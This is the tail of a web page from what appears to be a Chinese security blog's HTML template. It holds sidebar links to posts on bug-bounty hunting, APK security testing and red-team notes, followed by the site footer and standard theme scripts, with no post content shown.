href="/2025/11/06/SRC%E6%8C%96%E6%8E%98/" title="SRC挖掘">SRC挖掘</a><time datetime="2025-11-06T07:36:28.000Z" title="发表于 2025-11-06 15:36:28">2025-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/06/APK%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" title="APK安全测试">APK安全测试</a><time datetime="2025-11-06T02:04:28.000Z" title="发表于 2025-11-06 10:04:28">2025-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/04/RedteamNotes/" title="RedteamNotes">RedteamNotes</a><time datetime="2025-11-04T03:54:34.000Z" title="发表于 2025-11-04 11:54:34">2025-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By shaoxinSEC</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
